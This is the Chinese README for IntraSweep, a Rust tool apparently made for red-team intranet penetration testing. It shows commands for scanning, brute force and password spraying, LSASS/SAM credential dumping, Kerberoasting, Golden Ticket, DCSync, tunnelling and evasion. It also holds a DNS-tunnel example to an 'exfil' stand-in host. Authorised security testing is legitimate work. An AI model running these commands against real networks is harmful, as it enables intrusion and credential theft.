# IntraSweep

[![Rust](https://img.shields.io/badge/rust-1.85+-orange.svg)](https://www.rust-lang.org)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)]()
[![Release](https://img.shields.io/badge/release-v0.4.0-green.svg)]()

> 高性能 · 内网渗透侦察与打击工具

---

## 功能状态

> v0.4.0 基于代码审查报告进行了系统性修复，以下为各模块真实状态。

| 模块 | 状态 | 说明 |
|------|------|------|
| 端口扫描 / 主机发现 | ✅ 可用 | TCP Connect，自适应超时，FuturesUnordered 正确回收结果 |
| 服务探测 / Banner 抓取 | ✅ 可用 | 多协议识别 |
| Web 指纹识别 | ✅ 可用 | 33 条规则 |
| SSH / Redis / WinRM-Basic 爆破 | ✅ 可用 | 并发引擎 + 命中即停 |
| PostgreSQL / MySQL / MSSQL 爆破 | ✅ 已修复 | spawn_blocking 消除嵌套 runtime panic |
| MongoDB 爆破 | ✅ 已修复 | 强制 ping 验证，消除惰性连接误报 |
| RDP 爆破 | ⚠️ 有限 | CredSSP 协议实现不完整，成功判定不可靠 |
| NTLM 认证核心 | ✅ 已修复 | 安全缓冲 offset u32、Type2 flags 偏移修正、密码学随机 client challenge |
| SOCKS5 代理 | ✅ 已修复 | RFC 1929 认证缓冲区修正、域名解析修正、0xFF 拒绝 |
| 正向 / 反向 / 链式隧道 | ✅ 可用 | 基础 TCP 转发 |
| 加密隧道 (--encryption-key) | ❌ 未接线 | 显式报错退出，禁止静默明文 |
| HTTP / DNS 隧道 | ❌ 未接线 | CLI 已移除入口 |
| GPP 密码解密 | ✅ 已修复 | 正确微软公开密钥 + 全零 IV |
| DCSync | ❌ 未实现 | 显式报错，推荐 mimikatz / impacket |
| Golden Ticket / Silver Ticket | ❌ 未实现 | CLI 显式报错，推荐 mimikatz |
| Kerberoasting / AS-REP Roast | ⚠️ 有限 | 缺 TCP 长度前缀和 TGT/AP-REQ，真实 KDC 可能拒绝 |
| 漏洞扫描 (PoC 引擎) | ✅ 可用 | 32 条内置 PoC，匹配器已修正 |
| Web 主动探测 (--web-probe) | ❌ 未实现 | 显式报错退出 |
| AD LDAP 枚举 | ✅ 可用 | 用户/组/计算机/SPN/信任/GPO |
| BloodHound 导出 | ⚠️ 有限 | SID 为伪造，ACL 为空 |
| ADCS 枚举 | ⚠️ 有限 | 仅 ESC1 + ESC3 启发式 |
| 系统信息收集 | ✅ 可用 | 7 类收集 |
| 提权检测 (Linux) | ✅ 可用 | 8 类检查 |
| 提权检测 (Windows) | ⚠️ 有限 | 基于 wmic（Win11 已移除），DLL 类别为空实现 |
| EDR/AV 检测 | ✅ 可用 | 15+ 厂商签名 |
| 报告生成 | ⚠️ 有限 | 仅消费 AD 枚举 JSON |
| 配置文件 (--config) | ⚠️ 部分 | 加载但尚未完整传递到子命令 |
| 插件系统 | ❌ 未实现 | 无动态加载 |

---

## 介绍

**IntraSweep** 是一个基于 Rust 开发的高性能内网渗透测试工具，聚焦内网侦察与打击的核心环节：网络扫描、系统信息收集、弱口令爆破、内网穿透隧道、凭据与票据提取。专为红队单兵作业设计，提供从初始侦察到报告生成的一站式能力。

**核心优势**：
- **聚焦核心** — 围绕扫描、信息收集、弱口令爆破、SOCKS 隧道、凭据/票据提取五大能力深耕
- **高性能** — 异步 I/O 架构，自适应批处理与超时，Release 构建仅 **6.9 MB** 单二进制
- **跨平台** — Windows / Linux / macOS 原生支持
- **OPSEC 友好** — LTO + strip 最小体积、敏感字符串 XOR 编译期混淆、release panic=abort
- **模块化** — 插件系统支持动态加载扩展，YAML 配置文件预设参数

---

## 目录

- [安装](#安装)
- [快速开始](#快速开始)
  - [全局选项](#全局选项)
  - [网络扫描](#网络扫描)
  - [系统信息收集](#系统信息收集)
  - [密码爆破](#密码爆破)
  - [凭据收集与攻击](#凭据收集与攻击)
  - [漏洞扫描](#漏洞扫描)
  - [AD 域深度枚举](#ad-域深度枚举)
  - [提权检测](#提权检测)
  - [内网穿透](#内网穿透)
  - [报告生成](#报告生成)
- [项目结构](#项目结构)
- [命令参考](#命令参考)
- [漏洞扫描详解](#漏洞扫描详解)
- [AD 域深度枚举详解](#ad-域深度枚举详解)
- [凭据攻击详解](#凭据攻击详解)
- [提权检测详解](#提权检测详解)
- [EDR/AV 检测](#edrav-检测)
- [Web 指纹识别](#web-指纹识别)
- [攻击链覆盖](#攻击链覆盖)
- [技术栈与构建](#技术栈与构建)
- [版本](#版本)
- [License](#license)

---

## 安装

### 预编译二进制

从 [Releases](https://github.com/BlkSword/IntraSweep/releases) 页面下载对应平台的最新版本。

### 从源码构建

```bash
# 安装 Rust 工具链
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# 克隆仓库
git clone https://github.com/BlkSword/IntraSweep.git
cd IntraSweep

# Release 构建（推荐）
cargo build --release
```

可执行文件位于 `target/release/intrasweep`（Linux/macOS）或 `target/release/intrasweep.exe`（Windows）。

> **最终构建大小：~6.9 MB**（Windows x86-64，opt-level="z" + LTO + strip）

---

## 快速开始

### 全局选项

```bash
intrasweep -v <command> ...          # 详细输出 (DEBUG 级别日志)
intrasweep -q <command> ...          # 安静模式 (仅错误)
intrasweep --log-file log.txt <command> ...  # 日志写入文件
intrasweep --config profile.yaml <command> ...  # 从配置文件加载预设参数
```

配置文件为 YAML 格式：

```yaml
# intrasweep.yaml
defaults:
  concurrency: 50
  timeout: 10
  format: json

scan:
  targets: [192.168.1.0/24]
  type: comprehensive
  webfinger: true

crack:
  username_file: ./dict/users.txt
  password_file: ./dict/passwords.txt

tunnel:
  encryption_key: "my-secret"
```

CLI 显式参数优先级高于配置文件。

### 网络扫描

```bash
# 交互式向导（推荐）
intrasweep scan

# 直接扫描
intrasweep scan 192.168.1.0/24 port          # 端口扫描
intrasweep scan 192.168.1.0/24 host           # 主机发现
intrasweep scan 192.168.1.0/24 comprehensive  # 综合扫描（主机+端口+服务）

# 快速模式
intrasweep scan 192.168.1.0/24 port --fast

# Web 指纹识别
intrasweep scan 192.168.1.0/24 port --webfinger
intrasweep scan 192.168.1.0/24 comprehensive --webfinger -o result.json

# 输出格式
intrasweep scan 192.168.1.0/24 port --format csv -o result.csv
```

| 扫描类型 | 说明 |
|---------|------|
| `port` | 端口扫描（TCP Connect，自适应批处理 + 超时分级） |
| `host` | 主机发现（TCP Connect / ARP） |
| `comprehensive` | 综合扫描（主机发现 + 端口扫描 + 服务探测） |

| 主机发现方法 | 说明 |
|-------------|------|
| TCP Connect | 默认，多端口并行探测，跨平台无需特权 |
| ARP | 仅本地网段，速度快（Windows） |

> 注：主机发现与端口扫描统一走 TCP Connect。枚举中的 SYN/ICMP/UDP/SCTP 选项保留为兼容入口，实际语义同为 TCP Connect（`--help` 已标注）。

| 扫描预设 | 说明 |
|---------|------|
| Fast | 高并发、短超时 |
| Standard | 平衡速度与准确性 |
| Deep | 全端口扫描 |
| Stealth | 低并发、有延迟 |

### 系统信息收集

```bash
intrasweep system all        # 全量收集
intrasweep system system     # 系统信息（OS、主机名、架构、CPU、内存）
intrasweep system network    # 网络信息（接口、路由、ARP、连接）
intrasweep system process    # 进程信息（列表、可疑进程、资源占用）
intrasweep system credential # 凭据信息（密码哈希、令牌、SSH 密钥、API Key）
intrasweep system file       # 文件信息（敏感文件、配置文件、最近文件）
intrasweep system domain     # 域环境（域加入状态、域控、域用户、SPN）
intrasweep system all -o report.json   # 收集并保存
intrasweep system all -q               # 静默模式（不显示进度条）
```

| 命令 | 缩写 | 功能 |
|------|------|------|
| `all` | `a` | 全量收集 |
| `system` | `sy` | 系统信息 |
| `network` | `n` | 网络信息 |
| `process` | `p` | 进程信息 |
| `credential` | `c` | 凭据信息 |
| `file` | `f` | 文件信息 |
| `domain` | `d` | 域环境信息 |

### 密码爆破

```bash
# 交互式向导
intrasweep crack

# 直接爆破
intrasweep crack 192.168.1.1 -s ssh -u root -P passwords.txt
intrasweep crack 192.168.1.1 -s rdp -u administrator -P passwords.txt
intrasweep crack 192.168.1.1 -s redis -P passwords.txt
intrasweep crack 192.168.1.1 -s mysql -u root -P passwords.txt -c 20 -t 10

# 指定端口
intrasweep crack 192.168.1.1 -s ssh -p 2222 -u root -P passwords.txt

# 用户名字典
intrasweep crack 192.168.1.1 -s ssh -U users.txt -P passwords.txt

# 延迟（避免触发防护）
intrasweep crack 192.168.1.1 -s ssh -u root -P passwords.txt --delay 500

# 密码喷洒（少量密码 × 大量用户，轮间冷却防账户锁定；当前支持 SSH）
intrasweep crack 192.168.1.1 -s ssh -U domain_users.txt --spray
```

| 服务 | 默认端口 | 认证方式 |
|------|---------|---------|
| `ssh` | 22 | 密码/密钥 |
| `rdp` | 3389 | CredSSP/NLA + NTLMv2 |
| `redis` | 6379 | 密码 |
| `postgres` | 5432 | 密码 |
| `mysql` | 3306 | 密码 |
| `mssql` | 1433 | 密码 |
| `mongodb` | 27017 | 密码 |
| `winrm` | 5985 | NTLMv2 / Basic |

### 凭据收集与攻击

```bash
# 全量凭据收集（SAM / LSASS / 浏览器 / WiFi / 应用程序 / GPP）
intrasweep system credential

# Kerberoasting（需要域凭据）
intrasweep ad --dc 10.0.0.1 -d corp.local -u user -p pass -m kerberoast

# AS-REP Roasting（无需域凭据）
intrasweep ad --dc 10.0.0.1 -d corp.local -m asrep-roast

# GPP 密码解密（通过 SYSVOL 自动搜索）
intrasweep ad --dc 10.0.0.1 -d corp.local --gpp

# Golden Ticket 生成
intrasweep ad --dc 10.0.0.1 -d corp.local --golden-ticket --krbtgt-hash <hash>

# DCSync
intrasweep ad --dc 10.0.0.1 -d corp.local -u da_user -p password --dcsync
```

### 漏洞扫描

```bash
# 交互式向导
intrasweep vuln

# 对目标运行内置 PoC
intrasweep vuln 192.168.1.0/24
intrasweep vuln 192.168.1.0/24 --severity critical   # 仅检测严重漏洞
intrasweep vuln 192.168.1.0/24 --category 未授权     # 按类别过滤

# Web 主动探测（SQL 注入 / XSS / 命令注入 / 路径穿越）
intrasweep vuln 192.168.1.0/24 --web-probe

# 加载外部 PoC 文件/目录
intrasweep vuln 192.168.1.0/24 --poc-file ./pocs/

# 输出格式
intrasweep vuln 192.168.1.0/24 --format csv -o results.csv
```

### AD 域深度枚举

```bash
# 完整枚举（用户/组/计算机/Kerberoast/AS-REP/信任/GPO/ADCS）
intrasweep ad --dc 10.0.0.1 -d corp.local -u admin -p password

# 仅 Kerberoasting
intrasweep ad --dc 10.0.0.1 -d corp.local -u admin -p password -m kerberoast

# 仅 AS-REP Roasting
intrasweep ad --dc 10.0.0.1 -d corp.local -u admin -p password -m asrep-roast

# 导出 BloodHound 数据
intrasweep ad --dc 10.0.0.1 -d corp.local -u admin -p password -m bloodhound --bloodhound-dir ./bh_data

# ADCS 证书服务枚举
intrasweep ad --dc 10.0.0.1 -d corp.local -u admin -p password -m adcs

# 使用 LDAPS
intrasweep ad --dc 10.0.0.1 -d corp.local -u admin -p password --ssl

# 导出结果
intrasweep ad --dc 10.0.0.1 -d corp.local -u admin -p password -o ad_result.json
```

| 模式 | 说明 |
|------|------|
| `all`（默认） | 完整枚举 |
| `kerberoast` | 仅提取 Kerberoast 目标 |
| `asrep-roast` | 仅查找 AS-REP Roast 目标 |
| `bloodhound` | 枚举并导出 BloodHound 格式数据 |
| `adcs` | 枚举 ADCS 证书服务 |
| `gpp` | 搜索并解密 GPP 密码 |
| `dcsync` | DCSync 凭据同步攻击 |

### 提权检测

```bash
# 运行所有检查（自动识别 Windows / Linux）
intrasweep privesc

# 指定检查类别
intrasweep privesc --check service       # Windows: 服务相关
intrasweep privesc --check credentials   # Windows: 凭据相关
intrasweep privesc --check tokens        # Windows: 令牌特权
intrasweep privesc --check suid          # Linux: SUID 二进制
intrasweep privesc --check sudo          # Linux: Sudo 规则
intrasweep privesc --check docker        # Linux: Docker 组

# 导出结果
intrasweep privesc -o privesc_result.json
intrasweep privesc --format csv -o privesc_result.csv
```

### 内网穿透

```bash
# 交互式向导（推荐）
intrasweep tunnel

# 正向隧道 — 本地端口转发到远程目标
intrasweep tunnel forward -t 192.168.1.100:3389 -L 8080

# 反向隧道 — 从内网建立连接回外网
intrasweep tunnel reverse -t 10.0.0.1:8888 -L 8080

# SOCKS5 代理 — 动态端口转发（含目标连接重试，链路抖动自愈）
intrasweep tunnel socks5 -L 1080
intrasweep tunnel socks5 -L 1080 --socks5-username user --socks5-password pass

# 链式隧道 — 多级跳板连接
intrasweep tunnel chain -H 10.0.0.1:2222 -H 10.0.0.2:3333 -t 192.168.2.100:80

# 加密隧道 — XChaCha20-Poly1305 AEAD 加密传输
intrasweep tunnel forward -t 192.168.1.100:3389 -L 8080 --encryption-key "my-secret"

# HTTP 隧道
intrasweep tunnel http -t 192.168.1.100:80 -L 8080

# DNS 隧道
intrasweep tunnel dns -d exfil.example.com --encryption-key "my-secret"
```

### 报告生成

```bash
# 生成执行摘要（面向管理层）
intrasweep report --format executive -o summary.md

# 生成完整渗透报告（Markdown）
intrasweep report --format full -o pentest_report.md

# 生成 HTML 报告（自包含，可浏览器查看）
intrasweep report --format html -o pentest_report.html

# 包含 MITRE ATT&CK 映射
intrasweep report --format full --mitre -o report.md
```

---

## 项目结构

```
src/
├── main.rs             入口（命令路由、配置加载）
├── lib.rs              库入口
├── cli/                CLI 层（8 个命令处理 + 交互式向导）
│   ├── mod.rs          Commands 枚举、InteractiveMenu、全局参数
│   ├── scan.rs         扫描命令
│   ├── crack.rs        爆破命令
│   ├── tunnel.rs       隧道命令
│   ├── vuln.rs         漏洞扫描命令
│   ├── ad.rs           AD 枚举命令
│   ├── privesc.rs      提权检测命令
│   └── system.rs       信息收集命令
├── scanner/            扫描引擎
│   ├── mod.rs          统一入口（Scanner、主机发现、端口扫描、综合扫描）
│   ├── config.rs       ScanConfig + ScanPreset + HostScanMethod + PortScanMethod
│   ├── models.rs       ScanResult、HostResult、PortInfo、ServiceInfo、WebFingerprint
│   ├── host.rs         主机发现（TCP Connect 多端口并行探测）
│   ├── port.rs         端口扫描（异步 TCP Connect，自适应超时 + 超时分级 + 高并发）
│   ├── service.rs      ServiceIdentifier 多协议 Banner 抓取与版本解析
│   ├── domain.rs       DomainScanner 域信息扫描（net/nltest/setspn 命令）
│   ├── webfinger.rs    Web 指纹扫描（HTTP 响应分析 + favicon MMH3 哈希）
│   ├── webfinger_db.rs 指纹数据库（33 条规则）
│   └── arp.rs          ARP 扫描（Windows-only，SendARP API）
├── cred/               凭据攻击与收集（12 个子模块）
│   ├── mod.rs          CredManager、Credential（13 种凭据类型）、CredHarvestResult
│   ├── kerberoast.rs   Kerberoasting（SPN → TGS → hashcat）
│   ├── asrep_roast.rs  AS-REP Roasting（DONT_REQ_PREAUTH → TGT → hashcat）
│   ├── gpp.rs          GPP cpassword AES-256 解密 + SYSVOL 自动搜索
│   ├── sam.rs          SAM/SYSTEM 注册表导出（reg save / vssadmin / 直接访问）
│   ├── lsass.rs        LSASS dump（comsvcs.dll / procdump / PowerShell MiniDump）
│   ├── browser.rs      Chrome / Edge / Firefox / IE 浏览器密码提取
│   ├── wifi.rs         WiFi 密码（netsh wlan / NetworkManager / macOS 钥匙串）
│   ├── app_cred.rs     LaZagne-like 应用凭据（Navicat/DBeaver/FileZilla/Git/SSH/VPN/凭据管理器）
│   ├── dpapi.rs        DPAPI Master Key 与 Credential Blob 收集
│   ├── golden_ticket.rs Golden Ticket（krbtgt → TGT 伪造 + RC4 加密 + PAC 构造）
│   ├── silver_ticket.rs Silver Ticket（服务哈希 → TGS 伪造，7 种服务类型）
│   └── dcsync.rs       DCSync（DRSUAPI → NTLM 哈希提取，hashcat/pwdump 导出）
├── recon/              信息侦察与态势感知（9 个子模块）
│   ├── mod.rs          ReconEngine、ReconReport、SituationalInfo
│   ├── situational.rs  态势感知（OS/域/权限/网络适配器/软件/服务/补丁）
│   ├── host_info.rs    主机详情（CPU/内存/磁盘/本地用户/本地组/关键软件）
│   ├── edr_detect.rs   EDR/AV 检测（15+ 厂商进程/服务/注册表/文件路径签名）
│   ├── user_hunting.rs 用户会话猎杀（quser/net session/域管发现）
│   ├── share_hunting.rs 文件共享敏感信息搜索（55+ 敏感扩展名 + 26 关键字）
│   ├── bloodhound_auto.rs SharpHound/LDAP BloodHound 数据自动收集
│   ├── firewall.rs     防火墙规则收集（netsh advfirewall / iptables）
│   ├── vlan.rs         VLAN 与网络拓扑发现（子网计算/CIDR/路由表/ARP 扫描）
│   └── adcs.rs         ADCS 证书服务枚举（CA/模板/ESC1-ESC8 检测）
├── cracker/            密码爆破
│   ├── base.rs         并发引擎（Semaphore + AtomicBool 命中即停）
│   ├── service.rs      CrackService（8 种服务）、CrackConfig、Cracker trait
│   ├── dict.rs         DictManager 字典加载
│   ├── ntlm.rs         NTLMv2 认证（Negotiate/Challenge/Authenticate + HMAC-MD5）
│   ├── spray.rs        Password Spraying（SprayConfig，防账户锁定）
│   └── ...             各服务爆破实现（SSH/RDP/Redis/PostgreSQL/MySQL/MSSQL/MongoDB/WinRM）
├── tunnel/             网络穿透
│   ├── mod.rs          TunnelManager 工厂
│   ├── config.rs       TunnelConfig、TunnelType（Forward/Reverse/Socks5/Chain）
│   ├── models.rs       ConnectionInfo、TunnelStatus、TunnelEvent
│   ├── crypto.rs       XChaCha20-Poly1305 CryptoLayer + EncryptedStream
│   ├── shutdown.rs     CancellationToken 优雅关闭
│   ├── relay.rs        relay() 泛型双向中继
│   ├── forward.rs      正向隧道
│   ├── reverse.rs      反向隧道
│   ├── socks5.rs       RFC 1928 SOCKS5 代理（RFC 1929 用户密码认证 + 目标连接重试）
│   ├── chain.rs        多级链式跳板
│   ├── http.rs         HTTP CONNECT 代理隧道
│   └── dns.rs          DNS 隧道（Base32 子域名编码）
├── vuln/               漏洞扫描
│   ├── mod.rs          VulnScanner、VulnScanConfig
│   ├── poc.rs          PoCRule、Severity（5 级）、Transport（HTTP/TCP/Script）、Matcher、Extractor
│   ├── engine.rs       HTTP/TCP 请求执行 + 变量提取与传递
│   ├── builtin.rs      内置 PoC（31 条：反序列化/未授权/OA/RCE/信息泄露/配置检测）
│   ├── loader.rs       YAML/JSON 外部 PoC 加载
│   ├── matchers.rs     匹配器引擎（word/regex/status/binary，AND/OR 规则）
│   ├── script.rs       脚本 PoC 执行（Python/PowerShell/Bash）
│   └── webprobe.rs     Web 主动探测（SQLi/XSS/命令注入/路径穿越/默认凭据/信息泄露）
├── ad/                 AD 域深度枚举
│   ├── mod.rs          AdEnumResult、AdUser、AdGroup、AdComputer、KerberoastTarget 等
│   ├── ldap.rs         AdEnumerator + LdapConfig（SSL 支持、凭据认证）
│   └── bloodhound.rs   BloodHound JSON 导出（BhUser/BhGroup/BhComputer/BhAce）
├── privesc/            提权检测
│   ├── mod.rs          PrivescResult、PrivescFinding、PrivescSeverity
│   ├── windows.rs      Windows 7 类检查
│   └── linux.rs        Linux 8 类检查
├── collector/          信息收集
│   ├── mod.rs          InfoCollector 统一入口 + LayeredProgress 多层进度
│   └── models.rs       SystemReport、NetworkReport、ProcessReport、CredentialReport、FileReport
├── modules/collect/    信息收集底层实现
│   ├── system.rs       系统信息
│   ├── network.rs      网络信息（接口/路由/ARP/连接）
│   ├── process.rs      进程信息
│   ├── credential.rs   凭据信息（哈希/SSH密钥/API密钥/环境变量密钥/known_hosts/PuTTY/RDP 历史）
│   └── file.rs         文件搜索
├── core/               核心库
│   ├── error.rs        结构化错误（14 种变体）
│   ├── config.rs       配置文件加载（AppConfig/ScanProfile/CrackProfile/TunnelProfile）
│   ├── log.rs          日志初始化（tracing + env-filter）
│   ├── obfstr.rs       字符串编译期 XOR 混淆（sensitive::* 函数族）
│   ├── plugin.rs       插件系统（PluginManager/PluginType/PluginMeta，支持 .dll/.so/.dylib）
│   └── vault.rs        加密凭据库（Vault/VaultEntry，XChaCha20-Poly1305 + SHA-256）
└── output/             输出层
    ├── color.rs        彩色终端（16 ANSI 色 + Colorize trait + 语义状态色映射）
    ├── format.rs       JSON/CSV 双格式导出
    ├── progress.rs     扫描进度条 + 多层步骤进度
    ├── topology.rs     网络拓扑图（ASCII 终端 + HTML 可交互）
    └── report.rs       专业渗透报告（执行摘要/攻击链/发现清单/MITRE ATT&CK/时间线/修复建议）
```

---

## 命令参考

### Scan

| 参数 | 说明 |
|------|------|
| `<targets>` | 扫描目标（IP/CIDR/范围），可选，不填进入交互式 |
| `<scan_type>` | `port` / `host` / `comprehensive`，可选 |
| `--fast` | 快速扫描预设 |
| `--webfinger` | 启用 Web 指纹识别 |
| `--format` | 输出格式 `json` / `csv`（默认 `json`） |
| `-o` | 输出文件路径 |

### System

| 参数 | 说明 |
|------|------|
| `<item>` | 收集项目：`all(a)` `system(sy)` `network(n)` `process(p)` `credential(c)` `file(f)` `domain(d)` |
| `-o` | 输出文件路径 |
| `-q` | 静默模式（不显示进度条） |

### Crack

| 参数 | 说明 |
|------|------|
| `<target>` | 目标主机，可选，不填进入交互式 |
| `-s, --service` | 服务类型：`ssh` `rdp` `redis` `postgres` `mysql` `mssql` `mongodb` `winrm` |
| `-p, --port` | 端口（默认使用服务默认端口） |
| `-u, --usernames` | 用户名（逗号分隔） |
| `-U, --username-file` | 用户名字典文件 |
| `-P, --password-file` | 密码字典文件 |
| `-c, --concurrency` | 并发数（默认 10） |
| `-t, --timeout` | 超时秒数（默认 5） |
| `--delay` | 延迟毫秒数（用于避免触发防护） |
| `--spray` | 密码喷洒模式（针对域环境，防账户锁定） |

### Vuln

| 参数 | 说明 |
|------|------|
| `<targets>` | 扫描目标（IP/CIDR/host:port），可选，不填进入交互式 |
| `--poc-file` | 外部 PoC 文件或目录（YAML/JSON/脚本） |
| `--severity` | 按严重性过滤：`critical` `high` `medium` `low` `info` |
| `--category` | 按类别过滤 |
| `--web-probe` | 启用 Web 主动探测（SQLi/XSS/命令注入/路径穿越） |
| `--format` | 输出格式 `json` / `csv`（默认 `json`） |
| `-o` | 输出文件路径 |
| `-c, --concurrency` | 并发数（默认 20） |
| `-t, --timeout` | 超时秒数（默认 10） |

### Ad

| 参数 | 说明 |
|------|------|
| `--dc` | 域控 IP 地址（必填） |
| `-d, --domain` | 域名（必填，例 `corp.local`） |
| `-u, --username` | 认证用户名 |
| `-p, --password` | 认证密码 |
| `--ssl` | 使用 LDAPS（端口 636） |
| `-m, --mode` | 模式：`all`（默认） `kerberoast` `asrep-roast` `bloodhound` `adcs` `gpp` `dcsync` |
| `--bloodhound-dir` | BloodHound 输出目录（`--mode bloodhound` 时使用） |
| `--golden-ticket` | 生成 Golden Ticket（需同时指定 `--krbtgt-hash`） |
| `--krbtgt-hash` | krbtgt NTLM 哈希（用于 Golden Ticket） |
| `--format` | 输出格式（默认 `json`） |
| `-o` | 输出文件路径 |

### Privesc

| 参数 | 说明 |
|------|------|
| `-c, --check` | 检查类别，不填则运行全部 |
| `--format` | 输出格式（默认 `json`） |
| `-o` | 输出文件路径 |

**Windows 类别：** `service` `credentials` `registry` `tokens` `files` `patches` `dll`

**Linux 类别：** `suid` `capabilities` `cron` `writable` `docker` `sudo` `ssh` `kernel`

### Report

| 参数 | 说明 |
|------|------|
| `--format` | 报告格式：`executive` `full` `html` |
| `--mitre` | 包含 MITRE ATT&CK 映射 |
| `-o, --output` | 输出文件路径 |

---

## 漏洞扫描详解

### 内置 PoC 规则（31 条）

| 类别 | 数量 | 规则 |
|------|------|------|
| 反序列化 | 3 | Shiro-550, Fastjson, Log4Shell (CVE-2021-44228) |
| 未授权访问 | 15 | Nacos, Jenkins, Elasticsearch, Harbor, Redis, MongoDB, FTP 匿名, SMB 空会话, LDAP 空绑定, MSSQL SA 空密码, Memcached, ZooKeeper, Docker API, MySQL Root 空密码, phpMyAdmin |
| OA 系统 | 4 | 泛微OA, 致远OA, 通达OA, 蓝凌OA |
| RCE | 2 | WebLogic CVE-2020-14882, ThinkPHP 5.x RCE |
| 信息泄露 | 4 | .git 目录, .env 文件, Druid 监控, Spring Boot Actuator |
| 配置/检测 | 3 | SMB 签名未启用, RDP 开放, WinRM 开放 |

### Web 主动探测

| 探测类型 | 方法 | 风险 |
|---------|------|------|
| SQL 注入 | 基于时间的盲注（sleep/WAITFOR DELAY） | 严重 |
| XSS | 反射型 XSS payload 注入 | 中 |
| 命令注入 | 盲命令注入（ping/nslookup 回显） | 严重 |
| 路径穿越 | 目录遍历 payload（../etc/passwd） | 高 |
| 默认凭据 | 常见 admin/admin、root/root 等组合 | 高 |
| 信息泄露 | robots.txt、sitemap.xml、备份文件等 | 低 |

### 外部 PoC 格式

**HTTP 声明式 PoC：**

```yaml
id: example-poc
info:
  name: 示例漏洞检测
  severity: high
  category: 未授权
  description: 检测示例服务未授权访问
  remediation: 启用认证
transport: http
rules:
  - method: GET
    path: "/api/users"
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words: ["username", "password"]
```

**TCP 协议 PoC：**

```yaml
id: service-check
info:
  name: 服务检测
  severity: medium
transport: tcp
default-port: 6379
rules:
  - data: "INFO\r\n"
    read-size: 4096
    matchers:
      - type: word
        words: ["version"]
```

**多步骤 PoC**（变量提取 + 步骤间传递）：

```yaml
id: multi-step-example
info:
  name: 多步骤检测示例
  severity: critical
transport: http
rules:
  - method: POST
    path: "/login"
    body: "user=admin&pass=admin"
    extractors:
      - name: token
        type: regex
        part: body
        regex: '"token":"([a-f0-9]+)"'
    matchers:
      - type: status
        status: [200]
  - method: GET
    path: "/api/admin?token={{token}}"
    matchers:
      - type: word
        words: ["admin_panel"]
```

**Python 脚本 PoC**（适用于复杂检测逻辑）：

```yaml
id: custom-check
info:
  name: 自定义 Python 检测
  severity: critical
transport: script
script:
  interpreter: python3
  code: |
    import json, socket, sys
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    # ... 检测代码 ...
    print(json.dumps({"vulnerable": False, "evidence": ""}))
  args: ["{{target}}", "{{port}}"]
  timeout: 30
```

或引用外部脚本文件：

```yaml
transport: script
script:
  interpreter: python3
  file: pocs/ms17-010.py
  args: ["{{target}}", "{{port}}"]
```

脚本输出规范：

```json
{"vulnerable": true, "evidence": "检测到漏洞的证据", "detail": "详细信息"}
```

支持的解释器：`python3`、`python`、`powershell`、`pwsh`、`bash`、`sh`

### 匹配器类型

| 类型 | 说明 | 适用传输 |
|------|------|---------|
| word | 字符串包含匹配 | HTTP, TCP |
| regex | 正则表达式匹配 | HTTP, TCP |
| status | HTTP 状态码匹配 | HTTP |
| binary | 十六进制字节匹配 | TCP |

---

## AD 域深度枚举详解

通过 LDAP 协议连接域控，执行 Active Directory 信息收集。

| 功能 | 说明 |
|------|------|
| 用户枚举 | 查询所有域用户（管理员标识、启用状态、组成员关系、SPN、SID） |
| 组枚举 | 查询所有域组（成员列表、管理员组标识） |
| 计算机枚举 | 查询域内主机（操作系统版本、DNS 名称、启用状态） |
| Kerberoasting | 提取所有 SPN 账户，标注服务类型、管理员标识 |
| AS-REP Roasting | 查找不需要 Kerberos 预认证的用户 |
| 信任关系 | 枚举域信任（方向、类型、属性） |
| GPO 枚举 | 列出域内组策略对象 |
| ADCS 枚举 | CA 服务器 + 证书模板 + ESC1-ESC8 检测 |
| BloodHound 导出 | 生成 BloodHound 兼容 JSON（Users/Groups/Computers/Domains + ACL/SPN/边） |

---

## 凭据攻击详解

### Kerberoasting 流程

```
LDAP 查询 SPN 用户 → 对每个 SPN 发送 TGS-REQ → 解析 TGS-REP 提取加密票据
→ 输出 hashcat 格式 ($krb5tgs$23$*...) → 离线字典/暴力破解服务账户密码
```

### AS-REP Roasting 流程

```
LDAP 查询 DONT_REQ_PREAUTH 用户 → 发送无预认证 AS-REQ → 接收 AS-REP
→ 提取加密 TGT → 输出 hashcat 格式 ($krb5asrep$23$*...) → 离线破解
```

### GPP 密码解密

```
SMB 访问 \\DC\SYSVOL → 递归搜索 {GUID}\*\Preferences\ → 解析 Groups.xml 等
→ 提取 cpassword 属性 → Base64 解码 → AES-256-CBC 解密（微软公开密钥）
→ 获取明文密码
```

### Golden Ticket

```
krbtgt NTLM 哈希 + 域名 + 域 SID → RC4/AES 加密 PAC（含 Domain Admins 等组 RID）
→ 伪造 TGT → 注入 Kerberos 缓存 → 可冒充任意用户（包括不存在的）
```

---

## 提权检测详解

### Windows 检查项

| 类别 | 检查项 | 严重性 |
|------|--------|--------|
| 服务 | 未引用服务路径、弱服务权限、可写服务二进制 | 高危 |
| 注册表 | AlwaysInstallElevated | 严重 |
| 凭据 | cmdkey 存储凭据、自动登录密码、SAM 文件访问 | 严重 |
| 令牌 | SeDebugPrivilege、SeImpersonatePrivilege、SeLoadDriverPrivilege 等 | 高危 |
| 文件 | unattend.xml、sysprep 配置、凭据目录 | 高危~严重 |
| 补丁 | 缺失安全更新（MS17-010/SMBGhost/HiveNightmare 等 12 条补丁匹配） | 高危~严重 |
| DLL | DLL 劫持（可写路径 + 缺少引号） | 中 |

### Linux 检查项

| 类别 | 检查项 | 严重性 |
|------|--------|--------|
| SUID | GTFOBins 已知可利用 SUID 二进制（25+ 种） | 高危 |
| Capabilities | 危险 capabilities（cap_setuid、cap_sys_admin、cap_dac_override 等） | 高危 |
| Cron | 可写 cron 配置、用户 crontab | 高危~严重 |
| 可写文件 | /etc/passwd、/etc/shadow、/etc/sudoers | 严重 |
| Docker | Docker 组成员 | 严重 |
| Sudo | 危险 NOPASSWD 规则（GTFOBins） | 高危~严重 |
| SSH | 私钥文件、其他用户密钥 | 高危~严重 |
| 内核 | 已知漏洞匹配（Dirty Cow、Dirty Pipe、PwnKit、Baron Samedit） | 高危~严重 |

---

## EDR/AV 检测

内置 15+ 厂商签名库，通过进程/服务/注册表/文件系统多维度检测：

